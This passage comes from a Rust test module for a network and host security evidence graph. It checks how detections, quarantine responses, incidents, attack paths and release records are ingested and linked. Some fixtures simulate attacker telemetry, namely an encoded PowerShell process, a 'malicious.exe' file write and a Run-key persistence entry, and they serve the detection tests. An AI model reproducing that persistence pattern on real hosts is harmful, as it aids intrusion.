        g.ingest_host_event("{\"type\":\"process\",\"ts\":101.0,\"device_ip\":\"10.0.0.5\",\"pid\":1200,\"name\":\"powershell.exe\",\"cmdline\":\"-enc …\",\"parent_pid\":800}").unwrap();
        g.ingest_host_event("{\"type\":\"file\",\"ts\":102.0,\"device_ip\":\"10.0.0.5\",\"path\":\"C:/temp/malicious.exe\",\"action\":\"write\",\"pid\":1200}").unwrap();
        g.ingest_host_event("{\"type\":\"registry\",\"ts\":103.0,\"device_ip\":\"10.0.0.5\",\"key\":\"HKLM/…/Run\",\"action\":\"set\",\"pid\":1200}").unwrap();
        // correlate → incident, then walk the attack path
        let inc = g.correlate_incident("10.0.0.5", "Lateral movement + persistence").unwrap();
        let path = g.attack_path(&inc).unwrap();
        eprintln!("ATTACK PATH: {path}");
        // the incident's subgraph must span BOTH layers: device + detection + process + file + registry
        assert!(path.contains("incident_on_device") && path.contains("incident_includes_detection"));
        assert!(path.contains("process_on_device") && path.contains("process_accessed_file") && path.contains("process_touched_registry"));
        // nodes: incident + device + detection + flow + process + file + registry ≥ 7
        let n: i64 = path.split("\"node_count\":").nth(1).unwrap().split(',').next().unwrap().parse().unwrap();
        assert!(n >= 7, "attack path should span ≥7 nodes across network+host layers, got {n}");
    }

    // ---- rule-id-level ingest tests: beaconing (1000040) + lateral movement (1000041) -------------
    // PLM audit S6: category-path ingest was already covered above, but nothing proved a REAL
    // beaconing/lateral-movement detection — the exact JSON shape `napse-capture`'s
    // `beacon::BeaconAlert::to_json`/`lateral::LateralAlert::to_json` actually emit — round-trips
    // into the `detections` table under the CURRENT rule_id/category and is queryable back out.
    // Fixtures below are copied field-for-field from those `to_json` format strings (see
    // `modules/napse-capture/loader/src/beacon.rs` / `.../lateral.rs`), not invented.

    #[test]
    fn beaconing_detection_1000040_ingests_with_correct_rule_id_and_is_queryable() {
        let g = EvidenceGraph::open_memory().unwrap();
        // exact shape of `beacon::BeaconAlert::to_json(confirmed=true)`.
        let det = r#"{"ts":1500.123,"src_ip":"10.0.0.5","dst_ip":"104.20.20.20","dst_port":443,"proto":"tcp","severity":2,"rule_id":1000040,"rule_msg":"NAPSE C2 Beaconing Detected","mitre":"T1071.001","category":"c2_beacon","confidence":0.7300,"connection_count":12,"mean_interval_secs":60.000,"jitter_cv":0.0800,"confirmed":true,"src_mac":"aa:bb:cc:dd:ee:ff"}"#;
        let det_id = g.ingest_detection(det).unwrap().expect("beaconing detection must ingest");

        // round-trips into `detections` under the right rule_id/category (direct table check).
        let (rule_id, category): (i64, String) = g.conn.query_row(
            "SELECT rule_id, category FROM detections WHERE id=?",
            params![det_id], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
        assert_eq!(rule_id, 1000040, "must ingest under beacon::BEACON_RULE_ID");
        assert_eq!(category, "c2_beacon");

        // queryable back out via the public detections_by_categories API (the one Mission
        // Control's Detect workspace calls).
        let out = g.detections_by_categories(&["c2_beacon"], 10).unwrap();
        let v: serde_json::Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["count"], 1);
        assert_eq!(v["detections"][0]["rule_id"], 1000040);
        assert_eq!(v["detections"][0]["category"], "c2_beacon");
        assert_eq!(v["detections"][0]["mitre"], "T1071.001");
    }

    #[test]
    fn lateral_movement_detection_1000041_ingests_with_correct_rule_id_and_is_queryable() {
        let g = EvidenceGraph::open_memory().unwrap();
        // exact shape of `lateral::LateralAlert::to_json(confirmed=true)`.
        let det = r#"{"ts":1500.500,"src_ip":"10.0.0.7","dst_ip":"10.0.0.50","dst_port":445,"proto":"tcp","severity":2,"rule_id":1000041,"rule_msg":"NAPSE Lateral Movement Detected","mitre":"T1021","category":"lateral_movement","confidence":0.8000,"distinct_peers":6,"confirmed":true,"src_mac":"11:22:33:44:55:66"}"#;
        let det_id = g.ingest_detection(det).unwrap().expect("lateral-movement detection must ingest");

        let (rule_id, category): (i64, String) = g.conn.query_row(
            "SELECT rule_id, category FROM detections WHERE id=?",
            params![det_id], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
        assert_eq!(rule_id, 1000041, "must ingest under lateral::LATERAL_RULE_ID, not the stale 1000009");
        assert_eq!(category, "lateral_movement");

        let out = g.detections_by_categories(&["lateral_movement"], 10).unwrap();
        let v: serde_json::Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["count"], 1);
        assert_eq!(v["detections"][0]["rule_id"], 1000041);
        assert_eq!(v["detections"][0]["category"], "lateral_movement");
        assert_eq!(v["detections"][0]["mitre"], "T1021");
    }

    // ---- scan-responder documentation round-trip: intel + scan + response ------------------------

    /// The scan-responder's DOCUMENT step: a port-scan detection + its response event both land,
    /// linked, so `--correlate <scanner_ip>` shows "who they are" (host-intel JSON, outside this
    /// graph) + "what they did" (the detection) + "what we did" (the response) as ONE incident.
    /// This is the WAN-scanner shape (a public/TEST-NET address, ip-only quarantine on the WAN
    /// iface) — see `correlate_shows_lan_scan_detection_and_its_response` for the LAN shape.
    #[test]
    fn correlate_shows_scan_detection_and_its_response() {
        let g = EvidenceGraph::open_memory().unwrap();
        // "what they did": the NAPSE port-scan detection (exact schema napse-dpi emits).
        let scan = r#"{"ts":1000.5,"src_ip":"203.0.113.7","src_port":54321,"dst_ip":"192.168.1.10","dst_port":22,"proto":"tcp","severity":2,"rule_id":1000003,"rule_msg":"NAPSE Port Scan Detected","mitre":"T1046","category":"port_scan","confidence":0.9}"#;
        let det_id = g.ingest_detection(scan).unwrap().expect("port-scan detection ingests");

        // "what we did": the scan-responder's response event (render_response_json's shape) —
        // a WAN scanner is quarantined ip-only on the WAN iface (end0).
        let resp = r#"{"ts":1001.0,"rule_id":1000003,"src_ip":"203.0.113.7","dst_ip":"192.168.1.10","dst_port":22,"action":"quarantine","mechanism":"nft","target":"203.0.113.7","detail":"quarantined via nft on end0, TTL 300s, auto-revert — WAN scanner","ttl_secs":300,"status":"active"}"#;
        let resp_id = g.ingest_response(resp).unwrap().expect("response event ingests");

        let linked: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![det_id, "responded_with", resp_id], |r| r.get(0)).unwrap();
        assert_eq!(linked, 1, "the response must link to the detection it responded to");

        // correlate the scanner into an incident, then walk its attack path.
        let inc = g.correlate_incident("203.0.113.7", "Port scan").unwrap();
        let path = g.attack_path(&inc).unwrap();
        eprintln!("ATTACK PATH: {path}");
        assert!(path.contains("incident_includes_detection"), "incident must include the scan detection");
        assert!(path.contains("responded_with"), "attack path must include the response edge");
        assert!(path.contains("quarantined via nft on end0"), "the response's own detail must surface as a node label");
    }

    /// The LAN-scanner counterpart: an internal client (RFC1918) is quarantined ip+mac on the
    /// LAN iface (wlan0) — same track/trace shape, different mechanism string. Proves BOTH a
    /// LAN and a WAN scanner reach "who they are + what they did + what we did" via one path.
    #[test]
    fn correlate_shows_lan_scan_detection_and_its_response() {
        let g = EvidenceGraph::open_memory().unwrap();
        let scan = r#"{"ts":2000.0,"src_ip":"10.66.0.42","src_port":51000,"dst_ip":"10.66.0.1","dst_port":22,"proto":"tcp","severity":2,"rule_id":1000003,"rule_msg":"NAPSE Port Scan Detected","mitre":"T1046","category":"port_scan","confidence":0.8}"#;
        let det_id = g.ingest_detection(scan).unwrap().expect("LAN port-scan detection ingests");

        let resp = r#"{"ts":2001.0,"rule_id":1000003,"src_ip":"10.66.0.42","dst_ip":"10.66.0.1","dst_port":22,"action":"quarantine","mechanism":"nft","target":"10.66.0.42","detail":"quarantined via nft on wlan0, TTL 300s, auto-revert — LAN scanner","ttl_secs":300,"status":"active"}"#;
        let resp_id = g.ingest_response(resp).unwrap().expect("response event ingests");

        let linked: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![det_id, "responded_with", resp_id], |r| r.get(0)).unwrap();
        assert_eq!(linked, 1);

        let inc = g.correlate_incident("10.66.0.42", "LAN port scan").unwrap();
        let path = g.attack_path(&inc).unwrap();
        assert!(path.contains("responded_with"));
        assert!(path.contains("quarantined via nft on wlan0"), "LAN response must name the LAN iface, not the WAN one");
    }

    /// FIX 1 (PLM audit S3): a resource-shed response (`hookprobe_manifest::scan_responder`'s
    /// `render_shed_response_json` shape, rule_id 1000050) must synthesize its OWN detection —
    /// unlike a NAPSE-triggered response, there is no separate upstream alert line — and that
    /// detection must be honest (low severity, T1498, "self-reverting"/"resource-reality" in the
    /// message, never an identity/malicious verdict), link `responded_with`, and correlate into
    /// an incident exactly like every other detection->response pair.
    #[test]
    fn resource_shed_response_synthesizes_a_detection_and_correlates_into_an_incident() {
        let g = EvidenceGraph::open_memory().unwrap();
        // exact shape `render_shed_response_json` emits (mirrors scan_responder.rs).
        let resp = r#"{"ts":5000.0,"rule_id":1000050,"src_ip":"10.66.0.42","action":"resource_shed","mechanism":"nft","target":"10.66.0.42","signal":"conntrack_saturation","cap_new_conns_per_sec":5,"detail":"temporary per-source new-connection cap (5/s) on wlan0 — conntrack_saturation — 83.0% full, TTL 60s, self-reverting (never a durable/identity block)","ttl_secs":60,"status":"active"}"#;
        let resp_id = g.ingest_response(resp).unwrap().expect("shed response ingests");

        // A detection node must now exist for this shed, honestly framed.
        let (det_id, rule_id, category, severity, mitre, rule_msg): (String, i64, String, i64, String, String) = g
            .conn
            .query_row(
                "SELECT id, rule_id, category, severity, mitre, rule_msg FROM detections WHERE src_ip=?",
                params!["10.66.0.42"],
                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?, r.get(5)?)),
            )
            .expect("a detection must be synthesized for the shed");
        assert_eq!(rule_id, RESOURCE_SHED_RULE_ID);
        assert_eq!(category, "resource_shed");
        assert_eq!(mitre, "T1498");
        assert!(severity < 2, "must stay below the 'High' priority threshold — never an identity/malicious verdict");
        assert!(rule_msg.contains("self-reverting"), "the detection message itself must carry the honesty framing: {rule_msg}");
        assert!(rule_msg.contains("resource"), "must name resource-reality, not identity: {rule_msg}");

        // It must link responded_with, exactly like a NAPSE-triggered response would.
        let linked: i64 = g
            .conn
            .query_row(
                "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
                params![det_id, "responded_with", resp_id],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(linked, 1, "the shed response must link to its own synthesized detection");

        // And it must flow into the SAME detection -> correlate_all -> incident path every other
        // detection uses — the whole point of the fix (Detect/Investigate visibility).
        let n = g.correlate_all(0.0).unwrap();
        assert_eq!(n, 1, "correlate_all must pick up the shed source");
        let inc_id: String = g
            .conn
            .query_row("SELECT id FROM incidents WHERE device_ip=?", params!["10.66.0.42"], |r| r.get(0))
            .expect("an incident must exist for the shed source");
        let path = g.attack_path(&inc_id).unwrap();
        assert!(path.contains("incident_includes_detection"), "incident must include the shed detection");
        assert!(path.contains("responded_with"), "attack path must include the shed's response edge");
    }

    /// `resource_shed_revert` must NOT synthesize a second detection for the same source — it
    /// documents the SAME shed entry clearing, not a new event (would double-count one shed as
    /// two incidents/detections).
    #[test]
    fn resource_shed_revert_does_not_synthesize_a_second_detection() {
        let g = EvidenceGraph::open_memory().unwrap();
        let shed = r#"{"ts":5000.0,"rule_id":1000050,"src_ip":"10.66.0.42","action":"resource_shed","mechanism":"nft","target":"10.66.0.42","signal":"conntrack_saturation","cap_new_conns_per_sec":5,"detail":"capped","ttl_secs":60,"status":"active"}"#;
        g.ingest_response(shed).unwrap();
        let revert = r#"{"ts":5061.0,"rule_id":1000050,"src_ip":"10.66.0.42","action":"resource_shed_revert","mechanism":"nft","target":"10.66.0.42","signal":"conntrack_saturation","detail":"released","ttl_secs":60,"status":"reverted"}"#;
        g.ingest_response(revert).unwrap();
        let n: i64 = g.conn.query_row("SELECT count(*) FROM detections WHERE src_ip=?", params!["10.66.0.42"], |r| r.get(0)).unwrap();
        assert_eq!(n, 1, "the revert must not add a second detection for the same shed");
    }

    /// A response with no matching detection yet still ingests unlinked (mirrors
    /// `ingest_beacon`'s "still ingests unlinked" behavior for a beacon with no matching release).
    #[test]
    fn ingest_response_without_matching_detection_still_ingests_unlinked() {
        let g = EvidenceGraph::open_memory().unwrap();
        let resp = r#"{"ts":1.0,"rule_id":1000003,"src_ip":"9.9.9.9","dst_ip":"1.1.1.1","dst_port":80,"action":"log_only","mechanism":"nft","target":"9.9.9.9","detail":"NOT quarantined — allowlisted","ttl_secs":300,"status":"skipped"}"#;
        let resp_id = g.ingest_response(resp).unwrap().unwrap();
        let n: i64 = g.conn.query_row("SELECT count(*) FROM responses WHERE id=?", params![resp_id], |r| r.get(0)).unwrap();
        assert_eq!(n, 1);
        let (_, _, _, edges) = g.counts().unwrap();
        assert_eq!(edges, 0, "no matching detection yet → no edge, but the node still exists");
    }

    /// Re-ingesting the same response event (e.g. the evidence timer's next 2-min pass re-reads
    /// the append-only responses stream) must not duplicate the node or the edge.
    #[test]
    fn ingest_response_twice_is_idempotent() {
        let g = EvidenceGraph::open_memory().unwrap();
        let scan = r#"{"ts":1.0,"rule_id":1000003,"src_ip":"1.2.3.4","src_port":1,"dst_ip":"5.6.7.8","dst_port":22,"proto":"tcp","severity":2,"rule_msg":"NAPSE Port Scan Detected","mitre":"T1046","category":"port_scan","confidence":0.9}"#;
        g.ingest_detection(scan).unwrap();
        let resp = r#"{"ts":2.0,"rule_id":0,"src_ip":"1.2.3.4","dst_ip":"5.6.7.8","dst_port":22,"action":"quarantine","mechanism":"nft","target":"1.2.3.4","detail":"quarantined","ttl_secs":300,"status":"active"}"#;
        g.ingest_response(resp).unwrap();
        let (_, _, _, e1) = g.counts().unwrap();
        let responses1: i64 = g.conn.query_row("SELECT count(*) FROM responses", [], |r| r.get(0)).unwrap();
        g.ingest_response(resp).unwrap();
        g.ingest_response(resp).unwrap();
        let (_, _, _, e2) = g.counts().unwrap();
        let responses2: i64 = g.conn.query_row("SELECT count(*) FROM responses", [], |r| r.get(0)).unwrap();
        assert_eq!(e1, e2, "re-ingest must not duplicate edges");
        assert_eq!(responses1, responses2, "re-ingest must not duplicate the response node");
    }

    #[test]
    fn ingest_response_ignores_non_response_lines() {
        let g = EvidenceGraph::open_memory().unwrap();
        // a flow line has no "action" field at all.
        let flow = r#"{"type":"conn","ts":1.0,"src_ip":"1.2.3.4","src_port":1,"dst_ip":"5.6.7.8","dst_port":2,"proto":"tcp"}"#;
        assert!(g.ingest_response(flow).unwrap().is_none());
        assert!(g.ingest_response("not json").unwrap().is_none());
    }

    // ---- ADR 0011 build step 2: the lifecycle graph ----------------------------------------------

    #[test]
    fn sid_is_stable_across_calls_and_distinct_per_prefix() {
        // same (prefix,key) → same id every time (idempotent re-ingest depends on this).
        assert_eq!(sid("adr", "0012"), sid("adr", "0012"));
        // different prefix, same key text → different id (no cross-type collisions).
        assert_ne!(sid("adr", "0012"), sid("release", "0012"));
        // different key → different id.
        assert_ne!(sid("adr", "0011"), sid("adr", "0012"));
    }

    /// Writes one `NNNN-title.md` ADR fixture into a temp dir and returns the dir (kept alive by the
    /// caller) + the file path — mirrors the real `docs/adr/` header/status convention exactly.
    fn write_adr_fixture(dir: &Path, number: &str, title: &str, status: &str, extra_body: &str) -> std::path::PathBuf {
        let path = dir.join(format!("{number}-{}.md", title.to_lowercase().replace(' ', "-")));
        let body = format!("# ADR {number} — {title}\n\n**Status:** {status}\n\n{extra_body}\n");
        std::fs::write(&path, body).unwrap();
        path
    }

    #[test]
    fn ingest_adrs_parses_number_title_status_and_supersedes_edge() {
        let tmp = std::env::temp_dir().join(format!("hookprobe-evidence-adr-test-{}", std::process::id()));
        std::fs::create_dir_all(&tmp).unwrap();
        write_adr_fixture(&tmp, "0005", "Unified eBPF Detection", "✅ Accepted (2026-06-01).", "no supersession here.");
        let p12 = write_adr_fixture(
            &tmp, "0012", "Release Definition: Cortex Pass", "✅ Accepted (2026-07-03).",
            "This ADR explicitly supersedes ADR 0005's older phrasing; Supersedes ADR 0005.");

        let g = EvidenceGraph::open_memory().unwrap();
        let id5 = g.ingest_adr_file(&tmp.join("0005-unified-ebpf-detection.md")).unwrap().unwrap();
        let id12 = g.ingest_adr_file(&p12).unwrap().unwrap();

        // ids are the deterministic sid() over the zero-padded number, not the literal example string —
        // this crate's stable-id scheme is FNV-1a everywhere, lifecycle nodes included.
        assert_eq!(id5, sid("adr", "0005"));
        assert_eq!(id12, sid("adr", "0012"));

        let (number, title, status): (i64, String, String) = g.conn.query_row(
            "SELECT number, title, status FROM adrs WHERE id=?", params![id12],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))).unwrap();
        assert_eq!(number, 12);
        assert_eq!(title, "Release Definition: Cortex Pass");
        assert!(status.contains("Accepted"));

        // "Supersedes ADR 0005" on its own line → a supersedes edge 0012 -> 0005.
        let has_edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![id12, EDGE_SUPERSEDES, id5], |r| r.get(0)).unwrap();
        assert_eq!(has_edge, 1, "Supersedes mention must create exactly one supersedes edge");

        std::fs::remove_dir_all(&tmp).ok();
    }

    #[test]
    fn ingest_adrs_skips_non_adr_files_without_erroring() {
        let g = EvidenceGraph::open_memory().unwrap();
        let tmp = std::env::temp_dir().join(format!("hookprobe-evidence-adr-skip-{}", std::process::id()));
        std::fs::create_dir_all(&tmp).unwrap();
        let readme = tmp.join("README.md");
        std::fs::write(&readme, "# not an ADR\n").unwrap();
        assert!(g.ingest_adr_file(&readme).unwrap().is_none());
        std::fs::remove_dir_all(&tmp).ok();
    }

    fn sample_release_json(version: &str, gate_verdict: &str) -> String {
        serde_json::json!({
            "schema": 1, "kind": "release", "version": version, "channel": "stable",
            "ts": "2026-07-03T00:00:00Z",
            "images": [{"profile": "edge-pro", "arch": "arm64", "digest": "sha256:deadbeef"}],
            "platforms": ["rpi4"],
            "commits": [{"id": "abc123", "subject": "fix: greenboot health gate"}],
            "gates": [{"stage": "workspace-tests", "verdict": gate_verdict, "detail": "174 passed", "ts": "2026-07-03T00:00:00Z"}],
            "attestations": [], "sbom": "", "cbom": "", "provenance": "", "notes": "docs/releases/2026.7.md"
        }).to_string()
    }

    #[test]
    fn ingest_release_creates_release_commit_and_gate_nodes() {
        let g = EvidenceGraph::open_memory().unwrap();
        let rel_id = g.ingest_release(&sample_release_json("2026.7", "pass")).unwrap().unwrap();
        assert_eq!(rel_id, sid("release", "2026.7:stable"));

        let (version, channel): (String, String) = g.conn.query_row(
            "SELECT version, channel FROM releases WHERE id=?", params![rel_id],
            |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
        assert_eq!(version, "2026.7");
        assert_eq!(channel, "stable");

        let commit_id = sid("commit", "abc123");
        let subject: String = g.conn.query_row(
            "SELECT subject FROM commits WHERE id=?", params![commit_id], |r| r.get(0)).unwrap();
        assert_eq!(subject, "fix: greenboot health gate");
        let shipped: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![commit_id, EDGE_SHIPPED_IN, rel_id], |r| r.get(0)).unwrap();
        assert_eq!(shipped, 1);

        let gate_id = sid("gate", "2026.7:stable:workspace-tests");
        let verdict: String = g.conn.query_row(
            "SELECT verdict FROM gate_results WHERE id=?", params![gate_id], |r| r.get(0)).unwrap();
        assert_eq!(verdict, "pass");
        let validated: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![rel_id, EDGE_VALIDATED_BY, gate_id], |r| r.get(0)).unwrap();
        assert_eq!(validated, 1);
    }

    #[test]
    fn ingest_release_rejects_wrong_schema_and_kind() {
        let g = EvidenceGraph::open_memory().unwrap();
        let bad_schema = serde_json::json!({"schema": 2, "kind": "release", "version": "2026.7"}).to_string();
        assert!(g.ingest_release(&bad_schema).is_err());
        let bad_kind = serde_json::json!({"schema": 1, "kind": "beacon", "version": "2026.7"}).to_string();
        assert!(g.ingest_release(&bad_kind).is_err());
    }

    #[test]
    fn ingest_release_twice_is_idempotent_no_duplicate_edges() {
        let g = EvidenceGraph::open_memory().unwrap();
        let json = sample_release_json("2026.7", "pass");
        g.ingest_release(&json).unwrap();
        let (_, _, _, e1) = g.counts().unwrap();
        let edges1: i64 = g.conn.query_row("SELECT count(*) FROM edges", [], |r| r.get(0)).unwrap();
        g.ingest_release(&json).unwrap();
        g.ingest_release(&json).unwrap();
        let edges2: i64 = g.conn.query_row("SELECT count(*) FROM edges", [], |r| r.get(0)).unwrap();
        assert_eq!(edges1, edges2, "re-ingesting the same release.json must not duplicate edges");
        let (_, _, _, e2) = g.counts().unwrap();
        assert_eq!(e1, e2);

        // node counts must not grow either (upsert, not insert-again).
        let releases: i64 = g.conn.query_row("SELECT count(*) FROM releases", [], |r| r.get(0)).unwrap();
        let gates: i64 = g.conn.query_row("SELECT count(*) FROM gate_results", [], |r| r.get(0)).unwrap();
        let commits: i64 = g.conn.query_row("SELECT count(*) FROM commits", [], |r| r.get(0)).unwrap();
        assert_eq!((releases, gates, commits), (1, 1, 1));
    }

    fn sample_beacon_json(image_version: &str) -> String {
        serde_json::json!({
            "schema": 1, "kind": "beacon", "beacon_id": "salted-hash-abc",
            "image_version": image_version, "device_class": "edge-lite", "profile": "rpi4",
            "arch": "aarch64", "uptime_hours": 120,
            "boot": {"healthy": 12, "unhealthy": 0, "rollbacks": 0},
            "health": {"healed": 1, "failed": 0, "shed": 0, "reverted": 0},
            "qsecbit_avg": 0.87, "consent": "beacon-v1", "ts": "2026-07-03T00:00:00Z"
        }).to_string()
    }

    #[test]
    fn ingest_beacon_matches_existing_release_by_image_version() {
        let g = EvidenceGraph::open_memory().unwrap();
        let rel_id = g.ingest_release(&sample_release_json("2026.7", "pass")).unwrap().unwrap();
        let beacon_id = g.ingest_beacon(&sample_beacon_json("2026.7")).unwrap().unwrap();

        let (boot_healthy, qsecbit): (i64, f64) = g.conn.query_row(
            "SELECT boot_healthy, qsecbit_avg FROM beacons WHERE id=?", params![beacon_id],
            |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
        assert_eq!(boot_healthy, 12);
        assert!((qsecbit - 0.87).abs() < 1e-9);

        let measured: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![beacon_id, EDGE_MEASURED_ON, rel_id], |r| r.get(0)).unwrap();
        assert_eq!(measured, 1, "beacon must link to the matching release by image_version");
    }

    #[test]
    fn ingest_beacon_without_matching_release_still_ingests_unlinked() {
        let g = EvidenceGraph::open_memory().unwrap();
        // no release ingested yet — beacon must still land as a node, just with no measured_on edge.
        let beacon_id = g.ingest_beacon(&sample_beacon_json("2026.7")).unwrap().unwrap();
        let (_, _, _, edges) = g.counts().unwrap();
        assert_eq!(edges, 0);
        let n: i64 = g.conn.query_row(
            "SELECT count(*) FROM beacons WHERE id=?", params![beacon_id], |r| r.get(0)).unwrap();
        assert_eq!(n, 1);
    }

    #[test]
    fn ingest_beacon_rejects_wrong_schema_and_kind() {
        let g = EvidenceGraph::open_memory().unwrap();
        let bad_schema = serde_json::json!({"schema": 2, "kind": "beacon", "beacon_id": "x"}).to_string();
        assert!(g.ingest_beacon(&bad_schema).is_err());
        let bad_kind = serde_json::json!({"schema": 1, "kind": "release", "beacon_id": "x"}).to_string();
        assert!(g.ingest_beacon(&bad_kind).is_err());
    }

    #[test]
    fn link_feedback_creates_requirement_and_informed_by_edge() {
        let g = EvidenceGraph::open_memory().unwrap();
        // field evidence source: a detection node (mirrors "Incident/Detection → requirement", D1).
        let det_id = g.ingest_detection(
            "{\"ts\":1.0,\"rule_id\":42,\"rule_msg\":\"x\",\"category\":\"c\",\"severity\":1,\"src_ip\":\"1.2.3.4\",\"dst_ip\":\"5.6.7.8\",\"dst_port\":22,\"confidence\":0.5}"
        ).unwrap().unwrap();

        let req_id = g.link_feedback(&det_id, "faster-rollback-signal", Some("Faster rollback signal")).unwrap();
        assert_eq!(req_id, sid("req", "faster-rollback-signal"));
        let (slug, title, source): (String, String, String) = g.conn.query_row(
            "SELECT slug, title, source FROM requirements WHERE id=?", params![req_id],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))).unwrap();
        assert_eq!(slug, "faster-rollback-signal");
        assert_eq!(title, "Faster rollback signal");
        assert_eq!(source, "field-feedback");

        let edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![det_id, EDGE_INFORMED_BY, req_id], |r| r.get(0)).unwrap();
        assert_eq!(edge, 1);

        // linking a second source to the SAME slug must not create a duplicate requirement node —
        // the requirement is the roadmap anchor, many pieces of field evidence point at it.
        let req_id2 = g.link_feedback("det:other", "faster-rollback-signal", None).unwrap();
        assert_eq!(req_id, req_id2);
        let reqs: i64 = g.conn.query_row("SELECT count(*) FROM requirements", [], |r| r.get(0)).unwrap();
        assert_eq!(reqs, 1);
    }

    #[test]
    fn export_jsonl_includes_lifecycle_tables() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_release(&sample_release_json("2026.7", "pass")).unwrap();
        g.ingest_beacon(&sample_beacon_json("2026.7")).unwrap();
        g.link_feedback("release:test", "example-requirement", None).unwrap();

        let tmp = std::env::temp_dir().join(format!("hookprobe-evidence-export-test-{}", std::process::id()));
        std::fs::create_dir_all(&tmp).unwrap();
        g.export_jsonl(&tmp).unwrap();
        for f in ["releases.jsonl", "gate_results.jsonl", "commits.jsonl", "beacons.jsonl", "requirements.jsonl", "adrs.jsonl"] {
            let p = tmp.join(f);
            assert!(p.exists(), "{f} must be exported");
        }
        let releases_body = std::fs::read_to_string(tmp.join("releases.jsonl")).unwrap();
        assert!(releases_body.contains("\"version\":\"2026.7\""));
        std::fs::remove_dir_all(&tmp).ok();
    }

    // ---- ADR 0013 D4a: the MCP read-tool query methods --------------------------------------------

    #[test]
    fn graph_stats_reports_node_counts_and_edge_type_histogram() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_flow("{\"type\":\"conn\",\"ts\":1.0,\"src_ip\":\"1.2.3.4\",\"src_port\":5,\"dst_ip\":\"5.6.7.8\",\"dst_port\":22,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"orig_bytes\":0,\"resp_bytes\":0}").unwrap();
        g.ingest_detection("{\"ts\":1.0,\"rule_id\":1,\"rule_msg\":\"x\",\"category\":\"c\",\"severity\":1,\"src_ip\":\"1.2.3.4\",\"dst_ip\":\"5.6.7.8\",\"dst_port\":22,\"confidence\":0.5}").unwrap();
        let stats = g.graph_stats().unwrap();
        let v: serde_json::Value = serde_json::from_str(&stats).expect("graph_stats must be valid JSON");
        assert_eq!(v["nodes"]["devices"], 1);
        assert_eq!(v["nodes"]["flows"], 1);
        assert_eq!(v["nodes"]["detections"], 1);
        assert!(v["total_edges"].as_i64().unwrap() >= 2, "flow_from_device + detects_on_device + detection_on_flow");
        assert!(v["edges_by_type"]["flow_from_device"].as_i64().unwrap() >= 1);
        assert!(v["edges_by_type"]["detects_on_device"].as_i64().unwrap() >= 1);
    }

    #[test]
    fn recent_detections_orders_newest_first_and_clamps_limit() {
        let g = EvidenceGraph::open_memory().unwrap();
        for (i, ts) in [1.0, 2.0, 3.0].iter().enumerate() {
            let d = format!(
                "{{\"ts\":{ts},\"rule_id\":{},\"rule_msg\":\"det-{i}\",\"category\":\"c\",\"severity\":1,\"src_ip\":\"1.2.3.4\",\"dst_ip\":\"5.6.7.8\",\"dst_port\":22,\"confidence\":0.5}}",
                100 + i);
            g.ingest_detection(&d).unwrap();
        }
        let out = g.recent_detections(2).unwrap();
        let v: serde_json::Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["count"], 2, "limit=2 must clamp result to 2 rows");
        assert_eq!(v["detections"][0]["rule_msg"], "det-2", "newest (ts=3.0) first");
        assert_eq!(v["detections"][1]["rule_msg"], "det-1");

        // limit is clamped into [1,500], never trusted verbatim from an MCP caller.
        let unbounded = g.recent_detections(999_999).unwrap();
        let v2: serde_json::Value = serde_json::from_str(&unbounded).unwrap();
        assert_eq!(v2["count"], 3, "only 3 detections exist even though limit asked for far more");
    }

    #[test]
    fn lifecycle_trace_resolves_latest_and_exact_session_and_reports_not_found() {
        use std::io::Write;
        let g = EvidenceGraph::open_memory().unwrap();
        let log = "\
{\"kind\":\"intent\",\"session\":\"sess-1\",\"ts\":\"2026-07-03T20:00:00Z\",\"summary\":\"first prompt\",\"detail\":\"\"}
{\"kind\":\"change\",\"session\":\"sess-1\",\"ts\":\"2026-07-03T20:01:00Z\",\"summary\":\"Edit a.rs\",\"detail\":\"\"}
{\"kind\":\"intent\",\"session\":\"sess-2\",\"ts\":\"2026-07-03T21:00:00Z\",\"summary\":\"second session prompt\",\"detail\":\"\"}
{\"kind\":\"gate\",\"session\":\"sess-2\",\"ts\":\"2026-07-03T21:01:00Z\",\"summary\":\"cargo test -> 0\",\"detail\":\"\"}
";
        let path = std::env::temp_dir().join(format!("hp-lifecycle-trace-test-{}.jsonl", std::process::id()));
        std::fs::File::create(&path).unwrap().write_all(log.as_bytes()).unwrap();
        g.ingest_lifecycle_file(&path).unwrap();

        // "latest" resolves to sess-2 (the more recently active session).
        let latest = g.lifecycle_trace("latest").unwrap();
        let vl: serde_json::Value = serde_json::from_str(&latest).unwrap();
        assert_eq!(vl["found"], true);
        assert_eq!(vl["session"], "sess-2");
        assert_eq!(vl["intent"], "second session prompt");
        assert_eq!(vl["event_count"], 2);

        // exact session_key resolves the other session directly.
        let exact = g.lifecycle_trace("sess-1").unwrap();
        let ve: serde_json::Value = serde_json::from_str(&exact).unwrap();
        assert_eq!(ve["session"], "sess-1");
        assert_eq!(ve["intent"], "first prompt");
        assert_eq!(ve["event_count"], 2);
        assert_eq!(ve["events"][0]["summary"], "first prompt");
